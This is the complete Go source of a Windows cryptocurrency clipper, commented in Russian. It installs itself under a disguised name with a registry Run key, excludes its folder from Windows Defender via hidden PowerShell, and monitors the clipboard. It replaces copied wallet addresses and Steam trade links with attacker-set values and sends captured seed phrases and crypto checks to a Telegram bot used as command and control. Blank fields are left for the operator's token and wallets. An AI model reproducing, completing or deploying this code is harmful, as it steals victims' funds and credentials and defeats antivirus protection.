package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"regexp"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"
	"os/exec"
	"os/signal"

	"github.com/google/uuid"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

const (
	CF_UNICODETEXT      = 13
	GMEM_MOVEABLE       = 0x0002
	GMEM_ZEROINIT       = 0x0040
	GHND                = (GMEM_MOVEABLE | GMEM_ZEROINIT)
)

const (
	API_HOST_MASKED   = "6170692e74656c656772616d2e6f7267"
	API_PATH_MASKED   = "2f626f74"
	MAX_C2_RETRIES    = 5
)

const (
	RUN_KEY = `Software\Microsoft\Windows\CurrentVersion\Run`
    FAKE_PROCESS_NAME_MASKED = "737663686f73742e657865"
)

var BOT_ID = "bot_" + uuid.New().String()

var (
	kernel32 = windows.NewLazySystemDLL("kernel32.dll")
	user32   = windows.NewLazySystemDLL("user32.dll")
	advapi32 = windows.NewLazySystemDLL("advapi32.dll")
	
	procCreateMutexW      = kernel32.NewProc("CreateMutexW")
	
	procOpenClipboard     = user32.NewProc("OpenClipboard")
	procCloseClipboard    = user32.NewProc("CloseClipboard")
	procGetClipboardData  = user32.NewProc("GetClipboardData")
	procEmptyClipboard    = user32.NewProc("EmptyClipboard")
	procSetClipboardData  = user32.NewProc("SetClipboardData")
	procGlobalAlloc       = kernel32.NewProc("GlobalAlloc")
	procGlobalLock        = kernel32.NewProc("GlobalLock")
	procGlobalUnlock      = kernel32.NewProc("GlobalUnlock")
	
	procIsDebuggerPresent = kernel32.NewProc("IsDebuggerPresent")

	procSetConsoleTitleW = kernel32.NewProc("SetConsoleTitleW")
    procSetThreadHideFromDebugger = kernel32.NewProc("SetThreadInformation")
    procGetCurrentProcess = kernel32.NewProc("GetCurrentProcess")

	procRegOpenKeyExW = advapi32.NewProc("RegOpenKeyExW")
    procRegCreateKeyExW = advapi32.NewProc("RegCreateKeyExW")
    procRegQueryValueExW = advapi32.NewProc("RegQueryValueExW")
    procRegSetValueExW = advapi32.NewProc("RegSetValueExW")
    procRegCloseKey = advapi32.NewProc("RegCloseKey")
	
)

var (
    TelegramToken = "" // Токен бота
    TelegramChatID = "" // ID админа
    MutexName      = "Global\\MyUniqueMutex" // изменить MyUniqueMutex
)

const (
    REG_CONF_NAME = "WindowsUpdate"
    FAKE_EXE_NAME = "svchost_task.exe" 
)

func installToAutoRun() {
	executablePath, err := os.Executable()
	if err != nil {
		return
	}

	appData := os.Getenv("APPDATA")
	dstPath := appData + "\\" + FAKE_EXE_NAME
	if _, err := os.Stat(dstPath); os.IsNotExist(err) {
		srcFile, err := os.Open(executablePath)
		if err != nil {
			return
		}
		defer srcFile.Close()

		dstFile, err := os.Create(dstPath)
		if err != nil {
			return
		}
		
		io.Copy(dstFile, srcFile)

		junk := make([]byte, rand.Intn(2048)+1024)
		rand.Read(junk)
		dstFile.Write(junk)
		dstFile.Close()

		ptr, _ := windows.UTF16PtrFromString(dstPath)
		windows.SetFileAttributes(ptr, windows.FILE_ATTRIBUTE_HIDDEN|windows.FILE_ATTRIBUTE_SYSTEM)
	}

	k, err := registry.OpenKey(registry.CURRENT_USER, RUN_KEY, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		k, _, err = registry.CreateKey(registry.CURRENT_USER, RUN_KEY, registry.ALL_ACCESS)
		if err != nil {
			return
		}
	}
	defer k.Close()
	k.SetStringValue(REG_CONF_NAME, dstPath)
}

func addToDefenderExclusions(path string) {
	cmd := exec.Command("powershell", "-Command", "Add-MpPreference", "-ExclusionPath", "'"+path+"'")
	cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
	cmd.Run()
}

func getClipAddresses() map[string]string {
	return map[string]string{
		"BTC":        "", // BTС Кошелек для замены
		"BNB":        "", // BNB Кошелек для замены
		"LTC":        "", // LTC Кошелек для замены
		"DOGE":       "", // DOGE Кошелек для замены
		"TON":        "", // TON Кошелек для замены
		"USDT_TRC20": "", // USDT TRC20 / TRX Кошелек для замены
		"SOL":        "", // SOL Кошелек для замены
		"XMR":        "", // XMR Кошелек для замены
		"STEAMLINK":  "", // Ссылка на обмен STEAM для замены
	}
}

var clipPatternsOrdered = []struct {
	Name  string
	Regex *regexp.Regexp
}{
	{"SEED_PHRASE", regexp.MustCompile(`^([a-z]+(\s|$)){12,24}$`)},
	{"CRYPTOCEK", regexp.MustCompile(`^https:\/\/t\.me\/send\?start=CQ[A-Za-z0-9_-]+$`)},
	{"BTC", regexp.MustCompile(`^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$|^bc1[ac-hj-np-z02-9]{11,71}$`)},
	{"BNB", regexp.MustCompile(`^0x[a-fA-F0-9]{40}$`)},
	{"LTC", regexp.MustCompile(`^[LM3][a-km-zA-HJ-NP-Z1-9]{26,34}$|^ltc1[ac-hj-np-z02-9]{11,71}$`)},
	{"DOGE", regexp.MustCompile(`^[DA9][a-km-zA-HJ-NP-Z1-9]{33,34}$`)},
	{"TON", regexp.MustCompile(`^(EQ|UQ)[0-9a-zA-Z_-]{46,47}$`)},
	{"USDT_TRC20", regexp.MustCompile(`^T[a-km-zA-HJ-NP-Z1-9]{33}$`)},
	{"XMR", regexp.MustCompile(`^([48][0-9AB][123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{93}|4[0-9AB][123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{104})$`)},
	{"STEAMLINK", regexp.MustCompile(`^https:\/\/steamcommunity\.com\/tradeoffer\/new\/\?partner=\d+&token=[a-zA-Z0-9_-]+$`)},
	{"SOL", regexp.MustCompile(`^[1-9A-HJ-NP-Za-km-z]{32,44}$`)},
}

type SystemInfo struct {
	OS       string `json:"os"`
	Version  string `json:"version"`
	Hostname string `json:"hostname"`
}

type TelegramPayload struct {
	ChatID            string `json:"chat_id"`
	Text              string `json:"text"`
	ParseMode         string `json:"parse_mode,omitempty"`
	DisableNotification bool   `json:"disable_notification,omitempty"`
}

func getSystemInfo() SystemInfo {
	hostname, _ := os.Hostname()
	return SystemInfo{
		OS:       runtime.GOOS,
		Version:  runtime.GOARCH,
		Hostname: hostname,
	}
}

func getKeys(patterns []struct { Name string; Regex *regexp.Regexp }) []string {
	keys := make([]string, 0, len(patterns))
	for _, p := range patterns {
		keys = append(keys, p.Name)
	}
	return keys
}

func detectClipAddress(text string) string {
	text = strings.TrimSpace(text)
	for _, p := range clipPatternsOrdered {
		if p.Regex.MatchString(text) {
			return p.Name
		}
	}
	return ""
}

func getReplacementAddress(clipType string) string {
	return getClipAddresses()[clipType]
}

type C2Client struct {
	Token string
	ChatID string
	API_URL string
}

func NewC2Client() *C2Client {
    baseURL := "https://api.telegram.org/bot"
    
    return &C2Client{
        Token:   TelegramToken,
        ChatID:  TelegramChatID,
        API_URL: baseURL,
    }
}

func (c *C2Client) sendTelegramMessage(messageText string, silent bool, parseMode string) error {
	if c.Token == "" || c.ChatID == "" {
		return fmt.Errorf("C2: Токен или ID чата не установлены")
	}

	url := fmt.Sprintf("%s%s/sendMessage", c.API_URL, c.Token)
	payload := TelegramPayload{
		ChatID: c.ChatID,
		Text: messageText,
		ParseMode: parseMode,
		DisableNotification: silent,
	}

	jsonPayload, err := json.Marshal(payload)
	if err != nil {
		return fmt.Errorf("C2: Ошибка сериализации JSON: %w", err)
	}

	client := &http.Client{Timeout: 10 * time.Second}

	for i := 0; i < MAX_C2_RETRIES; i++ {
		resp, err := client.Post(url, "application/json", bytes.NewBuffer(jsonPayload))

		if err == nil {
			defer resp.Body.Close()

			if resp.StatusCode == http.StatusOK {
				return nil
			}

			if resp.StatusCode >= 500 && i < MAX_C2_RETRIES-1 {
				delay := time.Duration(1<<uint(i)) * time.Second
				randomDelay := delay + time.Duration(rand.Intn(1000))*time.Millisecond
				time.Sleep(randomDelay)
				continue
			} else {
				body, _ := io.ReadAll(resp.Body)
				return fmt.Errorf("C2_ERR: code %d, details: %s", resp.StatusCode, string(body))
			}
		}

		time.Sleep(time.Duration(rand.Intn(5)+1) * time.Second)
	}

	return fmt.Errorf("C2_FAIL: Все %d попыток отправки провалились", MAX_C2_RETRIES)
}

func (c *C2Client) SendClipNotification(originalAddress, replacedAddress, clipType string, sysInfo SystemInfo) {
    message := fmt.Sprintf(
        "🚨 <b>ЗАМЕНА АДРЕСА!</b>\n"+
            "🆔 Бот ID: <code>%s</code>\n"+
            "⏱️ Время: <code>%s</code>\n"+
            "🔗 Крипта: <b>%s</b>\n\n"+
            "➡️ <b>Оригинал:</b>\n<code>%s</code>\n\n"+
            "⬅️ <b>Замена:</b>\n<code>%s</code>\n\n"+
            "🖥️ <b>Система:</b>\nOS: <code>%s %s</code>\nHostname: <code>%s</code>",
        BOT_ID, time.Now().Format("2006-01-02 15:04:05"), clipType,
        originalAddress, replacedAddress,
        sysInfo.OS, sysInfo.Version, sysInfo.Hostname,
    )

    if err := c.sendTelegramMessage(message, false, "HTML"); err != nil {
    }
}

func (c *C2Client) SendSeedNotification(seedPhrase string, sysInfo SystemInfo) {
    message := fmt.Sprintf(
        "‼️ <b>ПОЛУЧЕНА СИД-ФРАЗА</b> ‼️\n\n"+
            "🆔 Бот ID: <code>%s</code>\n"+
            "⏱️ Время: <code>%s</code>\n\n"+
            "🔑 <b>СИД-ФРАЗА:</b>\n<code>%s</code>\n\n"+
            "🖥️ <b>Система:</b>\nOS: <code>%s %s</code>\nHostname: <code>%s</code>",
        BOT_ID, time.Now().Format("2006-01-02 15:04:05"), 
        seedPhrase,
        sysInfo.OS, sysInfo.Version, sysInfo.Hostname,
    )

    if err := c.sendTelegramMessage(message, false, "HTML"); err != nil {
    }
}

func (c *C2Client) SendCheckNotification(checkLink string, sysInfo SystemInfo) {
    message := fmt.Sprintf(
        "💸 <b>ПОЛУЧЕН ЧЕК КРИПТОБОТА</b> 💸\n\n"+
            "🆔 Бот ID: <code>%s</code>\n"+
            "⏱️ Время: <code>%s</code>\n\n"+
            "🔗 <b>ССЫЛКА НА ЧЕК:</b>\n<code>%s</code>\n\n"+
            "🖥️ <b>Система:</b>\nOS: <code>%s %s</code>\nHostname: <code>%s</code>",
        BOT_ID, time.Now().Format("2006-01-02 15:04:05"), 
        checkLink,
        sysInfo.OS, sysInfo.Version, sysInfo.Hostname,
    )

    if err := c.sendTelegramMessage(message, false, "HTML"); err != nil {
    }
}

func runMutexCheck() {
    hMutex, _, _ := procCreateMutexW.Call(
        0,
        0,
        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(MutexName))),
    )

    if hMutex != 0 {
        if windows.GetLastError() == syscall.ERROR_ALREADY_EXISTS {
            os.Exit(0) 
        }
    } else {
        os.Exit(1) 
    }
}

type WindowsClipboard struct {
	c2Client *C2Client
	sysInfo SystemInfo
	recentValue string
}

func (wc *WindowsClipboard) readClipboardSyscall() (string, error) {
	ret, _, err := procOpenClipboard.Call(0)
	if ret == 0 {
		return "", fmt.Errorf("OpenClipboard failed: %v", err)
	}
	defer procCloseClipboard.Call()

	ret, _, err = procGetClipboardData.Call(CF_UNICODETEXT)
	if ret == 0 {
		return "", fmt.Errorf("GetClipboardData failed: %v", err)
	}
	hMem := windows.Handle(ret)

	ret, _, err = procGlobalLock.Call(uintptr(hMem))
	if ret == 0 {
		return "", fmt.Errorf("GlobalLock failed: %v", err)
	}
	pText := ret
	defer procGlobalUnlock.Call(uintptr(hMem))

	text := windows.UTF16PtrToString((*uint16)(unsafe.Pointer(pText)))
	
	return text, nil
}

func (wc *WindowsClipboard) writeClipboardSyscall(text string) error {
	ret, _, err := procOpenClipboard.Call(0)
	if ret == 0 {
		return fmt.Errorf("OpenClipboard failed: %v", err)
	}
	defer procCloseClipboard.Call()

	ret, _, err = procEmptyClipboard.Call()
	if ret == 0 {
		return fmt.Errorf("EmptyClipboard failed: %v", err)
	}

	wstr, err := syscall.UTF16FromString(text)
	if err != nil {
		return fmt.Errorf("UTF16FromString failed: %v", err)
	}
	size := uintptr(len(wstr) * 2)

	ret, _, err = procGlobalAlloc.Call(GHND, size)
	if ret == 0 {
		return fmt.Errorf("GlobalAlloc failed: %v", err)
	}
	hMem := windows.Handle(ret)
	
	ret, _, err = procGlobalLock.Call(uintptr(hMem))
	if ret == 0 {
		return fmt.Errorf("GlobalLock failed: %v", err)
	}
	pText := ret
	copy((*[1 << 30]uint16)(unsafe.Pointer(pText))[:len(wstr)], wstr)
	procGlobalUnlock.Call(uintptr(hMem))

	ret, _, err = procSetClipboardData.Call(CF_UNICODETEXT, uintptr(hMem))
	if ret == 0 {
		return fmt.Errorf("SetClipboardData failed: %v", err)
	}
	
	return nil
}

func (wc *WindowsClipboard) processClipboardChange() {
	clipboardContent, err := wc.readClipboardSyscall()

	if err != nil {
		return
	}

	if clipboardContent != wc.recentValue && clipboardContent != "" {
		clipType := detectClipAddress(clipboardContent)

		if clipType == "SEED_PHRASE" {
			wc.c2Client.SendSeedNotification(clipboardContent, wc.sysInfo)
			wc.recentValue = clipboardContent 
			return
		}

		if clipType == "CRYPTOCEK" {
			wc.c2Client.SendCheckNotification(clipboardContent, wc.sysInfo)
			wc.recentValue = clipboardContent 
			return
		}
		
		if clipType != "" {
			replacement := getReplacementAddress(clipType)
			if replacement != "" && replacement != clipboardContent {
				
				if err := wc.writeClipboardSyscall(replacement); err == nil {
					wc.c2Client.SendClipNotification(clipboardContent, replacement, clipType, wc.sysInfo)
					wc.recentValue = replacement 
				} else {
					wc.recentValue = clipboardContent
				}
			} else {
				wc.recentValue = clipboardContent
			}
		} else {
			wc.recentValue = clipboardContent
		}
	}
}

func setupShutdownHandler(c2 *C2Client, sysInfo SystemInfo) {
    sigChan := make(chan os.Signal, 1)
    signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM, syscall.SIGHUP)

    go func() {
        sig := <-sigChan
        message := fmt.Sprintf(
            "🔴 <b>ПК ОТКЛЮЧЕН / ВЫКЛЮЧЕН</b>\n"+
            "🆔 Бот ID: <code>%s</code>\n"+
            "🖥️ Hostname: <code>%s</code>\n"+
            "⚠️ Сигнал: <code>%v</code>",
            BOT_ID, sysInfo.Hostname, sig,
        )
        c2.sendTelegramMessage(message, false, "HTML")
        
        time.Sleep(2 * time.Second)
        os.Exit(0)
    }()
}

func listenForAdminCommands(c2 *C2Client, sysInfo SystemInfo) {
	var lastUpdateID int64

	for {
		url := fmt.Sprintf("%s%s/getUpdates?offset=%d&timeout=20", c2.API_URL, c2.Token, lastUpdateID+1)
		resp, err := http.Get(url)
		if err != nil {
			time.Sleep(10 * time.Second)
			continue
		}

		var data struct {
			Ok     bool `json:"ok"`
			Result []struct {
				UpdateID int64 `json:"update_id"`
				Message  struct {
					Text string `json:"text"`
					Chat struct {
						ID int64 `json:"id"`
					} `json:"chat"`
				} `json:"message"`
			} `json:"result"`
		}

		if err := json.NewDecoder(resp.Body).Decode(&data); err == nil && data.Ok {
			for _, update := range data.Result {
				lastUpdateID = update.UpdateID
				
				if update.Message.Text == "/ping" {
					c2.sendTelegramMessage(fmt.Sprintf("✅ <b>ONLINE</b>\nID: <code>%s</code>\nHost: <code>%s</code>", BOT_ID, sysInfo.Hostname), true, "HTML")
				}
			}
		}
		resp.Body.Close()
		time.Sleep(5 * time.Second)
	}
}

func main() {
	runMutexCheck()

	addToDefenderExclusions(os.Getenv("APPDATA"))

	installToAutoRun()

	c2 := NewC2Client()
	sysInfo := getSystemInfo()

	setupShutdownHandler(c2, sysInfo)

	clipboardMonitor := &WindowsClipboard{
		c2Client: c2,
		sysInfo: sysInfo,
		recentValue: "",
	}
	
	messageStart := fmt.Sprintf(
		"🟢 <b>КЛИППЕР ЗАПУЩЕН</b>\n"+
			"🆔 Бот ID: <code>%s</code>\n"+
			"💰 Мониторинг валют: %s\n\n"+
			"<code>\nOS: %s %s\nHostname: %s\n</code>",
		BOT_ID, strings.Join(getKeys(clipPatternsOrdered), ", "),
		sysInfo.OS, sysInfo.Version, sysInfo.Hostname,
	)
	
	if err := c2.sendTelegramMessage(messageStart, false, "HTML"); err != nil {
	}

	go listenForAdminCommands(c2, sysInfo)

	for {
		clipboardMonitor.processClipboardChange()
		randomDelayMs := rand.Intn(201) + 250 
        time.Sleep(time.Duration(randomDelayMs) * time.Millisecond)
	}

}
